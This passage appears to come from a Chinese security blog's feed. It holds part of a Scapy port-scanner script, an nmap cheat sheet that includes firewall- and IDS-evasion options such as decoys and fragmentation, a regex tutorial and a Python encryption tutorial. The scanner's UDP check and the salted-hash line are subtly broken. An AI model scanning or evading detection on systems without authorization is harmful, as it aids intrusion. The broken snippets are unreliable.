class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">13</span>]):            print(<span class="hljs-string">'%s : %s Filtered'</span> % (ip, port))    screenLock.release()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fin_scan</span><span class="hljs-params">(ip,port)</span>:</span>    screenLock.acquire()    reply = sr1(IP(dst=ip) / TCP(sport=RandShort(), dport=port, flags=<span class="hljs-string">'F'</span>),timeout=<span class="hljs-number">5</span>)    <span class="hljs-keyword">if</span> (reply <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>):        print(<span class="hljs-string">'%s : %s Open or Filtered'</span> % (ip, port))    <span class="hljs-keyword">elif</span> (reply.haslayer(TCP)):        <span class="hljs-keyword">if</span> (reply.getlayer(TCP).flags == <span class="hljs-string">'RA'</span>):            print(<span class="hljs-string">'%s : %s Closed'</span> % (ip, port))    <span class="hljs-keyword">elif</span>(reply.haslayer(ICMP)):        <span class="hljs-keyword">if</span>(int(reply.getlayer(ICMP).type)==<span class="hljs-number">3</span> <span class="hljs-keyword">and</span> int(reply.getlayer(ICMP).code) <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">13</span>]):            print(<span class="hljs-string">'%s : %s Filtered'</span> % (ip, port))    screenLock.release()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">udp_scan</span><span class="hljs-params">(ip,port)</span>:</span>    screenLock.acquire()    reply=sr1(IP(dst=ip) / UDP(dport=port),timeout=<span class="hljs-number">10</span>)    <span class="hljs-keyword">if</span>(str(type(reply)==<span class="hljs-string">''</span>)):        print(<span class="hljs-string">'%s : %s Open or Filtered'</span> % (ip, port))    <span class="hljs-keyword">elif</span>(reply.haslayer(UDP)):        print(<span class="hljs-string">'%s : %s Open'</span> % (ip, port))    <span class="hljs-keyword">elif</span> (reply.haslayer(ICMP)):        <span class="hljs-keyword">if</span> (int(reply.getlayer(ICMP).type) == <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> int(reply.getlayer(ICMP).code)==<span class="hljs-number">3</span>):            print(<span class="hljs-string">'%s : %s Closed'</span> % (ip, port))        <span class="hljs-keyword">elif</span> (int(reply.getlayer(ICMP).type) == <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> int(reply.getlayer(ICMP).code) <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">13</span>]):            print(<span class="hljs-string">'%s : %s Filtered'</span> % (ip, port))    screenLock.release()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">banner</span><span class="hljs-params">()</span>:</span>    print(<span class="hljs-string">'''</span><span class="hljs-string">    -----------------------</span><span class="hljs-string">          My Scanner</span><span class="hljs-string">    -----------------------</span><span class="hljs-string">    -p/--port 指定端口</span><span class="hljs-string">    未指定时扫描常用服务端口</span><span class="hljs-string">    </span><span class="hljs-string">    可同时使用多种技术进行扫描</span><span class="hljs-string">    --icmp</span><span class="hljs-string">    --syn/--ack/--fin</span><span class="hljs-string">    --udp</span><span class="hljs-string">    </span><span class="hljs-string">    -h/--help 获取帮助</span><span class="hljs-string">    -----------------------</span><span class="hljs-string">    '''</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>    parser=argparse.ArgumentParser(description=banner())    <span class="hljs-comment"># 设置扫描ip地址和端口</span>    parser.add_argument(<span class="hljs-string">'ip'</span>,help=<span class="hljs-string">'设置目标IP'</span>)    parser.add_argument(<span class="hljs-string">'-p'</span>,<span class="hljs-string">'--port'</span>,dest=<span class="hljs-string">'port'</span>,action=<span class="hljs-string">'store'</span>,help=<span class="hljs-string">'设置目标端口,如80 80,81 80-90'</span>)    <span class="hljs-comment">#设置扫描类型</span>    parser.add_argument(<span class="hljs-string">'--icmp'</span>, dest=<span class="hljs-string">'icmp'</span>, default=<span class="hljs-number">0</span>, action=<span class="hljs-string">'store_true'</span>, help=<span class="hljs-string">'进行ICMP扫描'</span>)    parser.add_argument(<span class="hljs-string">'--syn'</span>, dest=<span class="hljs-string">'syn'</span>, default=<span class="hljs-number">0</span>, action=<span class="hljs-string">'store_true'</span>, help=<span class="hljs-string">'进行SYN扫描'</span>)    parser.add_argument(<span class="hljs-string">'--ack'</span>, dest=<span class="hljs-string">'ack'</span>, default=<span class="hljs-number">0</span>, action=<span class="hljs-string">'store_true'</span>, help=<span class="hljs-string">'进行ACK扫描'</span>)    parser.add_argument(<span class="hljs-string">'--fin'</span>, dest=<span class="hljs-string">'fin'</span>, default=<span class="hljs-number">0</span>, action=<span class="hljs-string">'store_true'</span>, help=<span class="hljs-string">'进行FIN扫描'</span>)    parser.add_argument(<span class="hljs-string">'--udp'</span>, dest=<span class="hljs-string">'udp'</span>, default=<span class="hljs-number">0</span>, action=<span class="hljs-string">'store_true'</span>, help=<span class="hljs-string">'进行UDP扫描'</span>)    args = parser.parse_args()    <span class="hljs-comment">#用正则表达式匹配输入的端口</span>    <span class="hljs-comment">#分别为指定单个端口，指定范围，用逗号分隔多个端口</span>    type1=<span class="hljs-string">r'\d&#123;1,5&#125;$'</span>                       <span class="hljs-comment"># -p 80</span>    type2=<span class="hljs-string">r'\d&#123;1,5&#125;-\d&#123;1,5&#125;$'</span>               <span class="hljs-comment"># -p 80-90</span>    type3=<span class="hljs-string">r'\d&#123;1,5&#125;(,\d&#123;1,5&#125;)+'</span>             <span class="hljs-comment"># -p 80,801</span>    port_list = list()    <span class="hljs-keyword">if</span> args.port:        <span class="hljs-keyword">if</span> re.match(type1,args.port):            port_list.append(args.port)        <span class="hljs-keyword">elif</span> re.match(type2,args.port):            temp_list=args.port.split(<span class="hljs-string">'-'</span>)            l=int(temp_list[<span class="hljs-number">0</span>])            r=int(temp_list[<span class="hljs-number">1</span>])            <span class="hljs-keyword">if</span> l&gt;r:                l,r=r,l            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> range(l,r+<span class="hljs-number">1</span>):                port_list.append(int(p))        <span class="hljs-keyword">elif</span> re.match(type3,args.port):            temp_list=args.port.split(<span class="hljs-string">','</span>)            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> temp_list:                port_list.append(p)    <span class="hljs-keyword">else</span>:        <span class="hljs-comment">#未指定端口时默认扫描的端口列表</span>        port_list=[<span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">25</span>,<span class="hljs-number">53</span>,<span class="hljs-number">80</span>,<span class="hljs-number">110</span>,<span class="hljs-number">443</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">8080</span>]    threads_ack=[]    threads_syn = []    threads_fin = []    threads_udp = []    start_time = time.time()    print(<span class="hljs-string">'------ 开始扫描... ... ------'</span>)    <span class="hljs-keyword">if</span> args.icmp:        print(<span class="hljs-string">'---------- ICMP扫描 ----------'</span>)        icmp_scan(args.ip)        print(<span class="hljs-string">'----------------------------'</span>)    <span class="hljs-keyword">if</span> args.syn:        print(<span class="hljs-string">'---------- SYN扫描 ----------'</span>)        <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> port_list:            t=Thread(target=syn_scan,args=(args.ip,int(port)))            threads_syn.append(t)        <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads_syn:            t.start()        <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads_syn:            t.join()        print(<span class="hljs-string">'----------------------------'</span>)    <span class="hljs-keyword">if</span> args.ack:        print(<span class="hljs-string">'---------- ACK扫描 ----------'</span>)        <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> port_list:            t = Thread(target=ack_scan, args=(args.ip, int(port)))            threads_ack.append(t)        <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads_ack:            t.start()        <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads_ack:            t.join()        print(<span class="hljs-string">'----------------------------'</span>)    <span class="hljs-keyword">if</span> args.fin:        print(<span class="hljs-string">'---------- FIN扫描 ----------'</span>)        <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> port_list:            t = Thread(target=fin_scan, args=(args.ip, int(port)))            threads_fin.append(t)        <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads_fin:            t.start()        <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads_fin:            t.join()        print(<span class="hljs-string">'----------------------------'</span>)    <span class="hljs-keyword">if</span> args.udp:        print(<span class="hljs-string">'---------- UDP扫描 ----------'</span>)        <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> port_list:            t = Thread(target=udp_scan, args=(args.ip, int(port)))            threads_udp.append(t)        <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads_udp:            t.start()        <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads_udp:            t.join()        print(<span class="hljs-string">'----------------------------'</span>)    end_time = time.time()    print(<span class="hljs-string">'--------- 扫描已完成！---------'</span>)    print(<span class="hljs-string">'--------- 用时：%s s---------'</span>%(end_time-start_time))<span class="hljs-keyword">if</span> __name__==<span class="hljs-string">'__main__'</span>:    main()</code></pre>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>渗透测试</tag>
      
      <tag>python</tag>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息收集方法总结</title>
    <link href="/nmap%E5%B8%B8%E7%94%A8%E6%89%AB%E6%8F%8F%E5%91%BD%E4%BB%A4/"/>
    <url>/nmap%E5%B8%B8%E7%94%A8%E6%89%AB%E6%8F%8F%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>本文总结了常用nmap常用的命令</p><a id="more"></a><h1 id="nmap常用扫描命令"><a href="#nmap常用扫描命令" class="headerlink" title="nmap常用扫描命令"></a>nmap常用扫描命令</h1><ol><li><p>只指定目标地址 nmap 192.168.0.1<br>将扫描目标主机是否开启，开放的端口及服务，目标MAC地址</p><p>可以使用多种方法指定目标主机，如：</p><ul><li>单个主机 192.168.0.1</li><li>网段 192.168.0.0/24</li><li>十进制的IP区间 192.168.0-2.1</li><li>多个目标 192.168.0.1, 172.168.3-5,9.1</li><li>标准格式的IPv6地址和主机名方式命名的IPv6主机地址</li><li>从文件中读取 -iL filename</li></ul></li><li><p>常用选项</p><ul><li>服务版本识别 -sV</li><li>操作系统检测 -O</li><li>脚本扫描 -sC</li><li>禁用主机检测 -Pn<br>nmap不检测主机是否开机，直接进行扫描</li><li>强力扫描 -A，包括 -sV -O –sC –traceroute</li><li>–traceroute</li></ul></li><li><p>TCP扫描</p><ul><li>TCP连接扫描 -sT<br>会进行完整的三次握手，速度较慢，可能会被发现，权限不足时，默认情况下将使用这种方法进行扫描</li><li>SYN扫描 -sS<br>又称半开扫描，不进行完整的三次握手，速度快，有高级别权限时，默认情况下将使用这种方法进行扫描<br>若回应的标志位为SYN、ACK，则端口开放<br>若回应的标志位为RST，则端口关闭</li><li>NULL扫描 -sN<br>不设置任何控制位<br>若目标主机无回应，则端口开放<br>若回应的标志位为RST，则端口关闭<br>若返回 ICMP 错误类型3且代码为1，2，3，9，10或13的数据包，则说明端口被服务器过滤了</li><li>FIN扫描 -sF<br>设置FIN标志位<br>若回应的标志位为RST，则端口关闭<br>若返回了一个 ICMP 数据包，其中包含 ICMP 目标不可达错误类型3以及 ICMP 状态码为1，2，3，9，10或13，则说明目标端口被过滤了无法确定是否处于开放状态</li><li>XMAS扫描 -sX<br>设置FIN、PSH、URG标志位<br>若目标主机无回应，则端口开放或被过滤<br>若回应的标志位为RST，则端口关闭<br>若返回了一个 ICMP 数据包，其中包含 ICMP 目标不可达错误类型3以及 ICMP 状态码为1，2，3，9，10或13，则说明目标端口被过滤了无法确定是否处于开放状态</li><li>ACK扫描 -sA，只能判断端口是否被过滤<br>设置ACK标志位<br>若回应的标志位为RST，则端口没有被过滤<br>若没有任何回应或者返回ICMP 错误类型3且代码为1，2，3，9，10或13的数据包，则说明端口被过滤且存在状态防火墙</li><li>窗口扫描 -sW<br>设置ACK标志位，会检查窗口大小的值<br>若回应的标志位为RST且窗口大小非零，则端口开放<br>若回应的标志位为RST且窗口大小为零，则端口关闭</li><li>Maimon扫描 -sM<br>设置FIN/ACK标志位<br>若数据包被丢弃，则端口开放<br>若回应的标志位为RST，则端口关闭</li><li>Idle扫描 -sI<br>使用僵尸主机进行扫描</li></ul></li><li><p>UDP扫描 -sU</p><p>不如TCP扫描可靠，且速度较慢<br>可以指定常用端口，使用并发扫描，绕过防火墙，设置超时来提高速度</p></li><li><p>输出选项</p><ul><li>交互（屏幕输出）<br>默认输出方式</li><li>正常输出 -oN<br>与默认类似，但是不显示runtime信息和警告信息</li><li>输出XML文件 -oX filename<br>导出XML文件</li><li>生成Grep文件 -oG</li></ul><p>使用-oA选项可以同时正常输出、输出为XML文件和Grep文件</p></li><li><p>时间选项 -T0~T5</p><p>一般不需要进行设置</p></li><li><p>脚本引擎<br>共有12个分类<br>auth,default,discovery,dos,exploit,external,fuzzer,instrusive,malware,safe,version,vuln<br>使用-sC或–script指定脚本<br>使用–script-args &lt;args&gt;传递参数</p></li><li><p>规避检测的选项</p><ul><li>使用小数据包 -f</li><li>设置数据包大小 –mtu 必须是8的倍数</li><li>改变数据包数据长度 –data-length</li><li>诱饵IP -D 掺杂一些假的源IP，可能造成网络拥堵</li><li>模拟源端口 –source-port</li><li>设置最大连接数 –max-parallelism</li><li>设置时间间隔 –scan-delay</li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>信息收集</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>工具使用</tag>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python 正则表达式</title>
    <link href="/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <url>/Python-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>本文总结了正则表达式的语法和Python中re模块的使用</p><a id="more"></a><h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><h2 id="01-字符含义"><a href="#01-字符含义" class="headerlink" title="01 字符含义"></a>01 字符含义</h2><ol><li><p>普通字符和11个元字符<br><img src="1.png" srcset="/img/loading.gif" alt=""><br>python中默认采用的是贪婪匹配，会输出最长的子串，添加？可以变成非贪婪匹配，输出最短子串</p><pre><code class="hljs python">a = re.match(<span class="hljs-string">'&lt;(.*)&gt;'</span>,<span class="hljs-string">'&lt;11&gt;&lt;22&gt;&lt;33&gt;'</span>).group()print(a)b = re.match(<span class="hljs-string">'&lt;(.*?)&gt;'</span>,<span class="hljs-string">'&lt;11&gt;&lt;22&gt;&lt;33&gt;'</span>).group()print(b)c=re.match(<span class="hljs-string">'A.*C'</span>,<span class="hljs-string">'AbCbbbCbbbC'</span>).group()print(c)d=re.match(<span class="hljs-string">'A.*?C'</span>,<span class="hljs-string">'AbCbbbCbbbC'</span>).group()print(d)<span class="hljs-string">'''</span><span class="hljs-string">&lt;11&gt;&lt;22&gt;&lt;33&gt;</span><span class="hljs-string">&lt;11&gt;</span><span class="hljs-string">AbCbbbCbbbC</span><span class="hljs-string">AbC</span><span class="hljs-string">'''</span></code></pre></li></ol><ol start="2"><li><p>预定义字符集（可以写在字符集[…]中）<br><img src="2.png" srcset="/img/loading.gif" alt=""></p></li><li><p>特殊分组用法<br><img src="4.png" srcset="/img/loading.gif" alt=""></p></li><li><p>常用表达式</p><p><a href="https://github.com/cdoco/common-regex" target="_blank" rel="noopener">https://github.com/cdoco/common-regex</a></p></li></ol><h2 id="02-re常用函数"><a href="#02-re常用函数" class="headerlink" title="02 re常用函数"></a>02 re常用函数</h2><ol><li><p><strong>compile(pattern,flags=0)</strong><br>编译正则表达式模式，返回一个对象的模式。（可以把常用的正则表达式编译成正则表达式对象，提高效率）</p><p>pattern: 编译时用的表达式字符串。</p><p>flags 编译标志位，用于修改正则表达式的匹配方式，如：是否区分大小写，多行匹配等。常用的flags有：<br><img src="3.png" srcset="/img/loading.gif" alt=""></p></li><li><p><strong>match(pattern, string,flags=0)</strong><br>尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，就返回None<br><strong>span表示只返回结果中的span元组，表示起始位置和结束位置，从0开始计数</strong></p><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<span class="hljs-comment"># match用于匹配字符串是否在开头的位置</span>print(re.match(<span class="hljs-string">'www'</span>,<span class="hljs-string">'www.baidu.com'</span>).span())  <span class="hljs-comment"># 只返回位置元组信息</span>print(re.match(<span class="hljs-string">'www$'</span>,<span class="hljs-string">'www.baidu.com'</span>))  <span class="hljs-comment"># $表示完全匹配</span>print(re.match(<span class="hljs-string">'baidu'</span>,<span class="hljs-string">'www.baidu.com'</span>))  <span class="hljs-comment">#不在起始位置，返回None</span><span class="hljs-string">'''</span><span class="hljs-string">(0, 3)</span><span class="hljs-string">None</span><span class="hljs-string">None</span><span class="hljs-string">'''</span></code></pre></li><li><p><strong>search(pattern, string,flags=0)</strong><br>re.search函数会在整个字符串内查找模式匹配,只要找到第一个匹配然后返回，如果字符串没有匹配，则返回None。</p><pre><code class="hljs python">print(re.match(<span class="hljs-string">'baidu'</span>,<span class="hljs-string">'www.baidu.com'</span>))print(re.search(<span class="hljs-string">'baidu'</span>,<span class="hljs-string">'www.baidu.com'</span>).span())print(re.search(<span class="hljs-string">'bili+'</span>,<span class="hljs-string">'www.bilibili.com'</span>))<span class="hljs-string">'''</span><span class="hljs-string">None</span><span class="hljs-string">(4, 9)</span><span class="hljs-string">&lt;re.Match object; span=(4, 8), match='bili'&gt;</span><span class="hljs-string">'''</span></code></pre><p><strong>注：match和search一旦匹配成功，就是一个match object对象，而match object对象有以下方法：</strong></p><ul><li>group() 返回被 RE 匹配的字符串</li><li>start() 返回匹配开始的位置</li><li>end() 返回匹配结束的位置</li><li>span() 返回一个元组包含匹配 (开始,结束) 的位置</li><li>group() 返回re整体匹配的字符串，可以一次输入多个组号，对应组号匹配的字符串</li></ul></li><li><p><strong>findall(pattern, string.flags=0)</strong><br>可以获取字符串中所有匹配的字符串，返回一个列表</p><pre><code class="hljs python">print(re.search(<span class="hljs-string">'\w*oo\w*'</span>,<span class="hljs-string">'cool,good,wow'</span>))print(re.findall(<span class="hljs-string">'\w*oo\w*'</span>,<span class="hljs-string">'cool,good,wow'</span>))<span class="hljs-string">'''</span><span class="hljs-string">&lt;re.Match object; span=(0, 4), match='cool'&gt;</span><span class="hljs-string">['cool', 'good']</span><span class="hljs-string">'''</span></code></pre></li><li><p><strong>finditer(pattern, string, flags=0)</strong><br>搜索string，返回一个顺序访问每一个匹配结果（Match对象）的迭代器。找到 RE 匹配的所有子串，并把它们作为一个迭代器返回。</p><pre><code class="hljs python">iter=re.finditer(<span class="hljs-string">'\d+'</span>,<span class="hljs-string">'10,9,8,7...'</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> iter:    print(i)    print(i.group())    print(i.span())    <span class="hljs-string">'''</span><span class="hljs-string">&lt;re.Match object; span=(0, 2), match='10'&gt;</span><span class="hljs-string">10</span><span class="hljs-string">(0, 2)</span><span class="hljs-string">&lt;re.Match object; span=(3, 4), match='9'&gt;</span><span class="hljs-string">9</span><span class="hljs-string">(3, 4)</span><span class="hljs-string">&lt;re.Match object; span=(5, 6), match='8'&gt;</span><span class="hljs-string">8</span><span class="hljs-string">(5, 6)</span><span class="hljs-string">&lt;re.Match object; span=(7, 8), match='7'&gt;</span><span class="hljs-string">7</span><span class="hljs-string">(7, 8)</span><span class="hljs-string">'''</span></code></pre></li><li><p><strong>split(pattern, string[, maxsplit])</strong></p><p>按照能够匹配的子串将string分割后返回列表。</p><p>可以使用re.split来分割字符串，如：re.split(r’\s+’, text)；将字符串按空格分割成一个单词列表。<br>maxsplit用于指定最大分割次数，不指定将全部分割。</p><pre><code class="hljs python">print(re.split(<span class="hljs-string">'\s'</span>,<span class="hljs-string">'hello my friend!'</span>))<span class="hljs-comment">#['hello', 'my', 'friend!']</span></code></pre></li><li><p><strong>sub(pattern, repl, string, count)</strong><br>使用repl替换string中每一个匹配的子串后返回替换后的字符串。</p><p>count表示最大替换个数，默认为0 ，每个匹配项都替换</p><pre><code class="hljs python">print(re.sub(<span class="hljs-string">'\d'</span>,<span class="hljs-string">'0'</span>,<span class="hljs-string">'123456789'</span>))print(re.sub(<span class="hljs-string">'\d'</span>,<span class="hljs-string">'0'</span>,<span class="hljs-string">'123456789'</span>,<span class="hljs-number">3</span>))<span class="hljs-string">'''</span><span class="hljs-string">000000000</span><span class="hljs-string">000456789</span><span class="hljs-string">'''</span></code></pre><p><strong>subn(pattern, repl, string, count=0, flags=0)</strong><br>返回替换后字符串和替换次数的元组</p> <pre><code class="hljs python"> print(re.sub(<span class="hljs-string">'\d'</span>,<span class="hljs-string">'0'</span>,<span class="hljs-string">'123456789'</span>))    print(re.subn(<span class="hljs-string">'\d'</span>,<span class="hljs-string">'0'</span>,<span class="hljs-string">'123456789'</span>))<span class="hljs-string">'''</span><span class="hljs-string">000000000</span><span class="hljs-string">('000000000', 9)</span><span class="hljs-string">'''</span></code></pre></li></ol>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具使用</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python中的RSA、DES、HASH加密</title>
    <link href="/Python%E4%B8%AD%E7%9A%84RSA%E3%80%81DES%E3%80%81HASH%E5%8A%A0%E5%AF%86/"/>
    <url>/Python%E4%B8%AD%E7%9A%84RSA%E3%80%81DES%E3%80%81HASH%E5%8A%A0%E5%AF%86/</url>
    
    <content type="html"><![CDATA[<p>本文总结了python中进行加密的几个模块的使用</p><a id="more"></a><h1 id="Python中的RSA、DES、HASH加密"><a href="#Python中的RSA、DES、HASH加密" class="headerlink" title="Python中的RSA、DES、HASH加密"></a>Python中的RSA、DES、HASH加密</h1><h2 id="01-加密的分类"><a href="#01-加密的分类" class="headerlink" title="01 加密的分类"></a>01 加密的分类</h2><ol><li><p>对称加密</p><ul><li>加密和解密都使用相同的密钥</li><li>密钥较短，加密处理简单，加解密速度快<br>适合于加密大量数据的场合</li><li>举例：DES、AES</li></ul></li><li><p>非对称加密</p><ul><li>加密使用公开的公钥，解密使用私钥</li><li>密钥大，加解密速度慢<br>一般用于加密少量数据，适用于互联网传输公钥，应用于数字签名</li><li>举例：RSA</li></ul></li><li><p>Hash算法/数字签名</p><ul><li>是一种单向算法，难以由密文得到明文，用于检查信息是否被篡改</li><li>举例：MD5、SHA</li></ul></li></ol><h2 id="02-python中的pyDes"><a href="#02-python中的pyDes" class="headerlink" title="02 python中的pyDes"></a>02 python中的pyDes</h2><p>官方文档：</p><pre><code class="hljs asciidoc">'''类初始化--------------------pyDes.des（key，[mode]，[IV]，[pad]，[padmode]）pyDes.triple<span class="hljs-emphasis">_des（key，[mode]，[IV]，[pad]，[padmode]）</span><span class="hljs-emphasis"></span><span class="hljs-emphasis">key-&gt;包含加密密钥的字节。DES 8个字节，16或24个字节</span><span class="hljs-emphasis">       用于三重DES</span><span class="hljs-emphasis">mode-&gt;加密类型的可选参数，可以是</span><span class="hljs-emphasis">       pyDes.ECB（电子密码簿）或pyDes.CBC（密码块链接）</span><span class="hljs-emphasis">如果使用CBC模式，则必须提供IV-&gt;可选的初始值字节。</span><span class="hljs-emphasis">       长度必须为8个字节。</span><span class="hljs-emphasis">pad-&gt;可选参数，设置填充字符（PAD_</span>NORMAL）以在<span class="hljs-code">       使用此实例完成的所有加密/解密操作。</span>padmode-&gt;可选参数，设置填充模式（PAD<span class="hljs-emphasis">_NORMAL或PAD_</span>PKCS5）<span class="hljs-code">       在对此实例执行的所有加密/解密操作期间使用。</span>我建议使用PAD<span class="hljs-emphasis">_PKCS5填充，因为这样您就不必担心任何</span><span class="hljs-emphasis">填充问题，因为在解密时可以明确删除填充</span><span class="hljs-emphasis">使用PAD_</span>PKCS5填充模式加密的数据。常用方法--------------加密（数据，[填充]，[填充模式]）解密（数据，[pad]，[padmode]）数据-&gt;要加密/解密的字节pad-&gt;可选参数。仅在使用PAD<span class="hljs-emphasis">_NORMAL的padmode时。对于</span><span class="hljs-emphasis">       加密时，将以下字符添加到数据块的末尾</span><span class="hljs-emphasis">       数据不是8个字节的倍数。对于解密，将删除</span><span class="hljs-emphasis">       最后8个与此填充字符匹配的结尾字符</span><span class="hljs-emphasis">       未加密数据块的字节。</span><span class="hljs-emphasis">padmode-&gt;可选参数，设置填充模式，必须为PAD_</span>NORMAL之一<span class="hljs-code">       或PAD_PKCS5）。默认为PAD_NORMAL。</span>'''</code></pre><p>示例程序：<br>python3中要使用字节</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> pyDes <span class="hljs-keyword">import</span> *<span class="hljs-keyword">if</span> __name__==<span class="hljs-string">'__main__'</span>:    Des_Key = <span class="hljs-string">"itsmykey"</span>    Des_IV = <span class="hljs-string">b"\x22\x33\x35\x81\xBC\x38\x5A\xE7"</span>    data=<span class="hljs-string">b'hello'</span>    k = des(Des_Key, CBC, Des_IV, pad=<span class="hljs-literal">None</span>, padmode=PAD_PKCS5)    d=k.encrypt(data)    print(<span class="hljs-string">'已加密'</span>,d)    t=k.decrypt(d)    text=str(t, encoding=<span class="hljs-string">'utf8'</span>)    print(<span class="hljs-string">'已解密'</span>,text)</code></pre><h1 id="03-python中的rsa"><a href="#03-python中的rsa" class="headerlink" title="03 python中的rsa"></a>03 python中的rsa</h1><pre><code class="hljs python"><span class="hljs-keyword">import</span> rsa<span class="hljs-comment"># 生成密钥</span>(pubkey, privkey) = rsa.newkeys(<span class="hljs-number">1024</span>)<span class="hljs-comment"># 保存密钥</span><span class="hljs-keyword">with</span> open(<span class="hljs-string">'public.pem'</span>, <span class="hljs-string">'w+'</span>) <span class="hljs-keyword">as</span> f:    f.write(pubkey.save_pkcs1().decode())<span class="hljs-keyword">with</span> open(<span class="hljs-string">'private.pem'</span>, <span class="hljs-string">'w+'</span>) <span class="hljs-keyword">as</span> f:    f.write(privkey.save_pkcs1().decode())<span class="hljs-comment"># 导入密钥</span><span class="hljs-keyword">with</span> open(<span class="hljs-string">'public.pem'</span>, <span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> f:    pubkey = rsa.PublicKey.load_pkcs1(f.read().encode())<span class="hljs-keyword">with</span> open(<span class="hljs-string">'private.pem'</span>, <span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> f:    privkey = rsa.PrivateKey.load_pkcs1(f.read().encode())<span class="hljs-comment"># 明文</span>message = <span class="hljs-string">'hello'</span><span class="hljs-comment"># 公钥加密</span>crypto = rsa.encrypt(message.encode(), pubkey)<span class="hljs-comment"># 私钥解密</span>message = rsa.decrypt(crypto, privkey).decode()print(message)<span class="hljs-comment"># 私钥签名</span>signature = rsa.sign(message.encode(), privkey, <span class="hljs-string">'SHA-1'</span>)<span class="hljs-comment"># 公钥验证</span>rsa.verify(message.encode(), signature, pubkey)</code></pre><h2 id="04-python中的hashlib"><a href="#04-python中的hashlib" class="headerlink" title="04 python中的hashlib"></a>04 python中的hashlib</h2><ol><li><p>md5<br>生成md5加密，由字符串生成摘要很容易，但由摘要回到字符串很难，因此可以用来检查信息是否被篡改</p><p>md5是最常见的摘要算法，生成结果是固定的128bit字节，通常用一个32位的16进制字符串表示</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlibtext=<span class="hljs-string">'hello'</span>md5text=hashlib.md5(text.encode()).hexdigest()</code></pre><p>数据量很大时，可以分段调用update</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlibtext=<span class="hljs-string">'hello python'</span>md5=hashlib.md5()md5.update(<span class="hljs-string">'hello'</span>.encode())md5.update(<span class="hljs-string">'python'</span>.encode())print(md5.hexdigest())</code></pre></li><li><p>sha1<br>sha1的结果是160bit字节，通常用40位的16进制字符串表示，更安全的算法时sha256和sha512，但更慢且更长</p><pre><code class="hljs python">   <span class="hljs-keyword">import</span> hashlib      text=<span class="hljs-string">'hello'</span>md5text=hashlib.sha1(text.encode()).hexdigest()</code></pre></li><li><p>两个不同的数据也可能算出相同的摘要，这称为碰撞<br>摘要算法通常用于数据库之中，黑客可以事先算出常见密码的摘要进行对比，为了更加安全，可以对原始字符串加一个复杂字符串来实现，俗称加盐</p><pre><code class="hljs python">salt_md5=hashlib.md5(text+<span class="hljs-string">'salt'</span>.encode()).hexdigest()</code></pre></li></ol>]]></content>
    
    
    <categories>
      
      <category>密码学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>密码学</tag>
      
      <tag>工具使用</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入 文件读写</title>
    <link href="/SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/"/>
    <url>/SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/</url>
    
